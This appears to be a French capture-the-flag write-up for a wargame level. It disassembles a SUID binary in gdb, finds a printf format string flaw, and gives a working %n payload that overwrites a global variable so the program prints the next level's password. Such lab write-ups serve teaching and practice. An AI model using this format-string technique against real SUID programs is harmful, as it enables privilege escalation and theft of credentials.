## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
  [...]
  ```
    - On a un binaire appartenant a level5 dans le home avec les droits SUID.

- `./level4`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - `test`
    - Le programme affiche le paramètre qu'on lui donne

- `gdb level4`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x08048444  p
      0x08048457  n
      0x080484a7  main
    [...]
    ```
    - on trouve une fonction n() et une fonction p() en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x080484a7 <+0>:	push   ebp
       0x080484a8 <+1>:	mov    ebp,esp
       0x080484aa <+3>:	and    esp,0xfffffff0
       0x080484ad <+6>:	call   0x8048457 <n>
       0x080484b2 <+11>:	leave
       0x080484b3 <+12>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire, alignement de la stack<br/><br/>
    - <+6>
      - Call la fonction n()<br/><br/>
    - <+11> ... <+12>
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>

  - `disas n`
    ```asm
    Dump of assembler code for function n:
       0x08048457 <+0>:	push   ebp
       0x08048458 <+1>:	mov    ebp,esp
       0x0804845a <+3>:	sub    esp,0x218
       0x08048460 <+9>:	mov    eax,ds:0x8049804
       0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
       0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
       0x08048471 <+26>:	lea    eax,[ebp-0x208]
       0x08048477 <+32>:	mov    DWORD PTR [esp],eax
       0x0804847a <+35>:	call   0x8048350 <fgets@plt>
       0x0804847f <+40>:	lea    eax,[ebp-0x208]
       0x08048485 <+46>:	mov    DWORD PTR [esp],eax
       0x08048488 <+49>:	call   0x8048444 <p>
       0x0804848d <+54>:	mov    eax,ds:0x8049810
       0x08048492 <+59>:	cmp    eax,0x1025544
       0x08048497 <+64>:	jne    0x80484a5 <n+78>
       0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
       0x080484a0 <+73>:	call   0x8048360 <system@plt>
       0x080484a5 <+78>:	leave
       0x080484a6 <+79>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 536 octets pour la stack)<br/><br/>
    - <+9> ... <+35>
      - Stocke dans eax la valeur du data segment register 0x8049804
        - `x/s 0x8049804`
          - `0x8049804 <stdin@@GLIBC_2.0>:	 ""`
      - Stocke la valeur de eax (stdin) sur la stack (à esp + 8)
      - Stocke 0x200 (512) sur la stack (à esp + 4)
      - Fait pointer eax sur ebp - 520
      - Stocke eax (l'adresse ebp - 520) sur la stack (à esp)
      - Call fgets() avec les arguments stockés sur la stack<br/><br/>
    - <+40> ... <+49>
      - Fait pointer eax sur ebp - 520 => l'adresse du retour de fgets()
      - Stocke eax (l'adresse du retour de fgets()) sur la stack (à esp)
      - Call la fonction p() avec l'argument stocké sur la stack<br/><br/>
    - <+54> ... <+73>
      - Stocke dans eax la valeur du data segment register 0x8049810
        - `x/s 0x8049810`
          - `0x8049810 <m>:	 ""`
      - Compare eax (la valeur de la globale m) avec 0x1025544 (16930116)
        - Jump à <+78> si la comparaison est fausse
        - sinon:
          - Stocke la la valeur de 0x8048590 sur la stack (à esp)
            - `x/s 0x8048590`
              ```
              0x8048590:	 "/bin/cat /home/user/level5/.pass"
              ```
          - Call system() avec l'argument stocké sur la stack<br/><br/>
    - <+78> ... <+79> <= Jump conditionnel depuis <+64>
      - Réinitialisation de la mémoire, fin d'exécution

  - `disas p`
    ```asm
    Dump of assembler code for function p:
       0x08048444 <+0>:	push   ebp
       0x08048445 <+1>:	mov    ebp,esp
       0x08048447 <+3>:	sub    esp,0x18
       0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
       0x0804844d <+9>:	mov    DWORD PTR [esp],eax
       0x08048450 <+12>:	call   0x8048340 <printf@plt>
       0x08048455 <+17>:	leave
       0x08048456 <+18>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 24 octets pour la stack)<br/><br/>
    - <+6> ... <+12>
      - Stocke dans eax la valeur à ebp + 12 (son premier argument)
      - Stocke eax sur la stack (à esp)
      - Call printf avec l'argument stocké sur la stack
    - <+17> ... <+18>
      - Réinitialisation de la mémoire, fin d'exécution

## Exploit

Ca resemble fortement au niveau précédent, il n'y a même que 3 différences:
- on a une fonction en plus qui fait le call a printf
- m est comparé à 16930116
- le programme ne pop pas un shell mais nous cat directement le contenu du fichier .pass

On cherche l'offset de notre format string:
- `echo "AAAA %x %x %x %x" | ./level4`
  ```
  AAAA b7ff26b0 bffff754 b7fd0ff4 0
  ```
- `echo "AAAA %x %x %x %x %x %x %x %x" | ./level4`
  ```
  AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510
  ```
- `echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4`
  ```
  AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141
  ```
  - Ca y est ! On sait que l'on commence à lire sur la format string au 12eme paramètre (41414141)

On lance notre payload malicieux avec 16930112 de padding (16930116 - les 4 octets nécessaires pour notre adresse)
- `python -c 'print "\x10\x98\x04\x08%1$16930112d%12$n"' | ./level4`
  ```
               -1208015184
  0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
  ```
